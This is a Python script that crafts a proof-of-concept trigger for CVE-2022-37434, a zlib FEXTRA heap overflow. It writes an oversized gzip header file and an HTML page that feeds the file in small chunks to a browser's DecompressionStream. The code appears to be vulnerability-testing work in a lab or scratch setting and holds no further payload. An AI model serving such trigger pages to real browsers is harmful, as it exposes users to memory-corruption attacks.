#!/usr/bin/env python3
# craft_fextra.py -- build a CVE-2022-37434 trigger gzip (large FEXTRA) and a
# SELF-CONTAINED inflate HTML (base64-embedded, chunked DecompressionStream).
import struct, zlib, base64, os, sys

OUT = "/home/box/.hermes/profiles/seraphine/cache/scratch/websrv"
os.makedirs(OUT, exist_ok=True)

XLEN = 65535                      # max EXTRA field (37434 trigger size)
EXTRA = b"\x00" * XLEN           # clean zeros (no lab PAD artifacts)
# minimal valid raw-deflate body (empty payload)
co = zlib.compressobj(9, zlib.DEFLATED, -15)
body = co.compress(b"") + co.flush()
crc = zlib.crc32(b"") & 0xffffffff
# gzip: magic, CM=8, FLG=FEXTRA(0x04), MTIME=0, XFL=0, OS=255, XLEN(LE), EXTRA, deflate, CRC32, ISIZE
hdr = b"\x1f\x8b" + bytes([8, 0x04]) + struct.pack("<I", 0) + bytes([0, 255]) + struct.pack("<H", XLEN) + EXTRA
gz = hdr + body + struct.pack("<II", crc, 0)
open(os.path.join(OUT, "fextra.gz"), "wb").write(gz)
print(f"fextra.gz: {len(gz)} bytes (XLEN={XLEN}, EXTRA={XLEN} zeros, deflate body {len(body)}B)")

b64 = base64.b64encode(gz).decode()
html = f"""<!doctype html><meta name="viewport" content="width=device-width,initial-scale=1">
<title>fextra chunked inflate (37434)</title>
<style>body{{font:15px system-ui;margin:2rem}}pre{{white-space:pre-wrap;background:#eee;padding:1rem}}.ok{{color:#176b2c}}.bad{{color:#9b1c1c}}</style>
<h3>fextra chunked inflate (CVE-2022-37434)</h3><pre id="out">ready</pre>
<script>
const B64 = "{b64}";
const out = document.querySelector('#out');
const log = (...x) => {{ out.textContent += '\\n' + x.join(' '); }};
function b64ToBytes(b) {{ const s = atob(b); const a = new Uint8Array(s.length); for (let i=0;i<s.length;i++) a[i]=s.charCodeAt(i); return a; }}
async function run() {{
  out.textContent = 'starting…';
  try {{
    if (!('DecompressionStream' in self)) throw new Error('DecompressionStream unavailable');
    const bytes = b64ToBytes(B64);
    log('gzip bytes:', bytes.length);
    const CHUNK = 512;   // feed in small chunks so the 64KB FEXTRA splits across reads (37434 precondition)
    const stream = new ReadableStream({{
      start(c) {{ for (let i=0;i<bytes.length;i+=CHUNK) c.enqueue(bytes.slice(i, i+CHUNK)); c.close(); }}
    }}).pipeThrough(new DecompressionStream('gzip'));
    const reader = stream.getReader();
    let chunks=0, n=0;
    for (;;) {{ const x = await reader.read(); if (x.done) break; chunks++; n += x.value.byteLength; log('chunk', chunks, 'bytes', x.value.byteLength, 'total', n); }}
    out.className='ok'; log('DONE: decompressed', n, 'bytes in', chunks, 'chunks');
  }} catch (e) {{ out.className='bad'; log('ERROR:', e && e.stack ? e.stack : e); }}
}}
run();
</script>"""
open(os.path.join(OUT, "fextra_inflate.html"), "w").write(html)
print(f"fextra_inflate.html: {len(html)} bytes (self-contained, base64 gzip, 512B chunks)")
